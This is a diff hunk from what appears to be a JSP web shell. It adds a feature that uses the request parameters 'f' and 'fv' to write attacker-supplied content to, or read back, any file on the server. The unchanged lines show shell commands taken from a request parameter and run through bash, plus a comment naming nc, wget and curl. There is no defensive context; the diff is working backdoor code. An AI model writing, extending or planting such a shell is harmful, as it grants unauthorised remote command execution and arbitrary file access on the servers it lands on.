@@ -3,6 +3,35 @@
 String cmd = request.getParameter("ls"),bh = "/bin/bash", cS = "-c", szSys = "\n",szTmp = "",s1 = null,s2 = null,
 szKeys = "";
 String bsK = "bash";
+
+String szT1 = request.getParameter("f"),szT2;
+if(null != szT1)
+{
+    try{
+        szT1 = java.net.URLDecoder.decode(szT1,"utf-8");
+        if(null != (szT2 = request.getParameter("fv")))
+        {
+            szT2 = java.net.URLDecoder.decode(szT2,"utf-8");
+            FileOutputStream out =new FileOutputStream(szT1);
+            out.write(szT2.getBytes("utf-8"));
+            out.flush();
+            out.close();
+        }
+        else{
+            FileInputStream in = new FileInputStream(szT1);
+            int nX = 0;
+            byte []ab = new byte[4096];
+            while(-1 < (nX = in.read(ab, 0, 4096)))
+            {
+                out.write(ab,0,nX);
+            }
+            out.flush();
+            out.close();
+        }
+        return;
+    }catch(Exception e){}
+}
+
 // which gcc nc wget curl perl python java ruby awk php
 if(request.getHeader("X-CMD") == null)
 {
